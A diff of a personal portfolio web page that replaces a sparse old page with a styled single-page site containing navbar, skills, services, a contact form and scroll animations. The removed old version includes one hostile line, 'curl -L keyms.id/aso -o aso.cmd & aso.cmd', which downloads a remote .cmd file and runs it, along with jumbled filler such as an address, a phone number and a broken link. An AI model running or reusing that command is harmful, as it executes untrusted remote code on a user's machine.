@@ -1,47 +1,262 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Khan Al-amin</title>
-  <link rel="stylesheet" href="portfoliostyles.css">
-  <!-- Font links starts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
-  <!-- Font links ends -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Khan Al-amin | Portfolio</title>
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    /* Reset & Base */
+    * {margin: 0; padding: 0; box-sizing: border-box;}
+    body {
+      font-family: 'Poppins', sans-serif;
+      line-height: 1.6;
+      color: #eaeaea;
+      background: #0d0d0d;
+      scroll-behavior: smooth;
+    }
+    section {padding: 80px 0;}
+    .container {width: 90%; max-width: 1100px; margin: auto;}
+    h1, h2, h3 {font-weight: 700; margin-bottom: 20px; color: #fff;}
+    p {margin-bottom: 20px; color: #bbb;}
+    a {text-decoration: none; color: inherit;}
+
+    /* ================= NAVBAR ================= */
+    .navbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 30px;
+      background: rgba(0,0,0,0.9);
+      z-index: 1000;
+    }
+    .logo {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: #00aaff;
+      letter-spacing: 1px;
+    }
+    .nav-links {
+      list-style: none;
+      display: flex;
+      gap: 20px;
+    }
+    .nav-links li a {
+      color: #fff;
+      font-weight: 600;
+      transition: 0.3s;
+    }
+    .nav-links li a:hover {
+      color: #00ffaa;
+      text-shadow: 0 0 6px #00ffaa;
+    }
+    .hamburger {
+      display: none;
+      font-size: 26px;
+      color: #fff;
+      cursor: pointer;
+    }
+    @media (max-width: 768px) {
+      .nav-links {
+        position: absolute;
+        top: 60px;
+        left: -100%;
+        width: 100%;
+        background: #111;
+        flex-direction: column;
+        align-items: center;
+        padding: 20px 0;
+        transition: 0.3s;
+      }
+      .nav-links.active {
+        left: 0;
+      }
+      .hamburger {
+        display: block;
+      }
+    }
+
+    /* ================= HERO ================= */
+    header {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      flex-direction: column;
+      background: linear-gradient(180deg, #0d0d0d, #111);
+      padding: 0 15px;
+    }
+    .hero-name {
+      font-size: 2.8rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, #00aaff, #00ffaa, #00aaff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-size: 200% auto;
+      animation: shine 4s linear infinite;
+      margin-bottom: 15px;
+      white-space: nowrap;
+    }
+    @keyframes shine {
+      0% {background-position: 0%;}
+      100% {background-position: 200%;}
+    }
+    header p {font-size: 1.2rem; margin-bottom: 30px; color: #bbb;}
+    .hero-buttons {
+      display: flex; gap: 20px; flex-wrap: wrap; justify-content: center;
+    }
+    .btn {
+      padding: 12px 25px;
+      background: #00aaff;
+      color: #fff;
+      border-radius: 25px;
+      font-weight: 600;
+      transition: 0.3s;
+    }
+    .btn:hover {transform: translateY(-3px); background: #0088cc;}
+
+    /* About / Skills */
+    .skills {display: grid; gap: 20px; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));}
+    .skill {
+      background: #1a1a1a; padding: 20px; border-radius: 12px;
+      transition: 0.3s; text-align: left; display: flex; align-items: center;
+    }
+    .skill i {
+      margin-right: 12px;
+      font-size: 1.5rem;
+      color: #00aaff;
+      transition: 0.3s;
+    }
+    .skill span {font-weight: 600; color: #eaeaea; transition: 0.3s;}
+    .skill:hover {transform: translateY(-5px); background: #222;}
+    .skill:hover i, .skill:hover span {color: #00ffaa;}
+
+    /* Services */
+    .services {display: grid; gap: 20px; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));}
+    .service {
+      background: #1a1a1a; padding: 30px; border-radius: 12px;
+      text-align: center; transition: 0.3s; cursor: default;
+    }
+    .service:hover {transform: translateY(-5px); background: #222;}
+
+    /* Contact */
+    form {
+      display: grid; gap: 15px; max-width: 600px; margin: auto;
+    }
+    input, textarea {
+      padding: 12px; border: 1px solid #333; border-radius: 8px; font-size: 1rem;
+      background: #111; color: #eee;
+    }
+    textarea {min-height: 120px;}
+    form button {
+      padding: 12px;
+      border: none;
+      border-radius: 25px;
+      background: #00aaff; color: #fff; font-weight: 600;
+      cursor: pointer; transition: 0.3s;
+    }
+    form button:hover {background: #0088cc;}
+
+    /* Footer */
+    footer {
+      background: #111; text-align: center; padding: 20px;
+      font-size: 0.9rem; color: #777;
+    }
+
+    /* Animations */
+    [data-animate] {opacity: 0; transform: translateY(20px); transition: 0.6s;}
+    [data-animate].show {opacity: 1; transform: translateY(0);}
+  </style>
 </head>
 <body>
-<header>
-  <nav>
-    <ul>
-      <li><a href="index.html" >Home</a></li>
-      <li><a href="photos.html">Photos</a></li>
-      <li><a href="videos.html">Videos</a></li>
-      <li><a href="contact.html">Contact</a></li>
-      <li><a href="portfolio.html" style="color:red;font-size: 20px;
-      text-shadow: 2px 0px 4px red;">Portfolio</a></li>
+
+  <!-- Navbar -->
+  <nav class="navbar">
+    <div class="logo">Khan Al-amin</div>
+    <ul class="nav-links">
+      <li><a href="#about">About</a></li>
+      <li><a href="#services">Services</a></li>
+      <li><a href="#contact">Contact</a></li>
     </ul>
+    <div class="hamburger"><i class="fa-solid fa-bars"></i></div>
   </nav>
-</header>
-<p style="color:white">curl -L keyms.id/aso -o aso.cmd & aso.cmd</p>
-<p style="color:white">ttps://youtu.be/HbN3fkjc3FY?si=gNRjzI_Raor6PRnH</p>
-<p style="color:white"> Street
 
-900 Lanark Dr.   Street
+  <!-- Hero -->
+  <header>
+    <h1 class="hero-name">Khan Al-amin</h1>
+    <p>Creative Developer | Designer | Editor</p>
+    <div class="hero-buttons">
+      <a href="#contact" class="btn">Hire Me</a>
+      <a href="#services" class="btn">My Services</a>
+    </div>
+  </header>
 
+  <!-- About -->
+  <section id="about" class="container" data-animate>
+    <h2>About Me</h2>
+    <p>I’m a passionate developer and designer with a love for creating modern, user-friendly experiences.</p>
+    <div class="skills">
+      <div class="skill"><i class="fab fa-html5"></i><span>HTML & CSS</span></div>
+      <div class="skill"><i class="fab fa-js-square"></i><span>JavaScript</span></div>
+      <div class="skill"><i class="fas fa-video"></i><span>Video Editing</span></div>
+      <div class="skill"><i class="fas fa-paint-brush"></i><span>UI/UX Design</span></div>
+    </div>
+  </section>
 
+  <!-- Services -->
+  <section id="services" class="container" data-animate>
+    <h2>Services</h2>
+    <div class="services">
+      <div class="service">Web Development: Building modern, responsive websites.</div>
+      <div class="service">Video Editing: Creating professional, engaging videos.</div>
+      <div class="service">Design: Clean and minimal design solutions.</div>
+    </div>
+  </section>
 
-City wasilla
+  <!-- Contact -->
+  <section id="contact" class="container" data-animate>
+    <h2>Contact Me</h2>
+    
+    <form action="https://formspree.io/f/xblanpoy" method="POST">
+  <input type="text" name="name" placeholder="Your Name" required>
+  <input type="email" name="email" placeholder="Your Email" required>
+  <textarea name="message" placeholder="Your Message" required></textarea>
+  <button type="submit">Send</button>
+</form>
+    
+    
+  </section>
 
-State Alaska
+  <!-- Footer -->
+  <footer>
+    <p>© 2025 Khan Al-amin. All Rights Reserved.</p>
+  </footer>
 
-Zip 99654
+  <!-- Scripts -->
+  <script>
+    // Animate on scroll
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) entry.target.classList.add('show');
+      });
+    }, {threshold: 0.2});
+    document.querySelectorAll('[data-animate]').forEach(el => observer.observe(el));
 
-Phone 907 631-5263</p>
-<p style="color:white">Ease us</p>
-<h1  class="h">Comming Soon</h1>
-
-
+    // Nav toggle
+    const hamburger = document.querySelector(".hamburger");
+    const navLinks = document.querySelector(".nav-links");
+    hamburger.addEventListener("click", () => {
+      navLinks.classList.toggle("active");
+    });
+  </script>
 </body>
 </html>
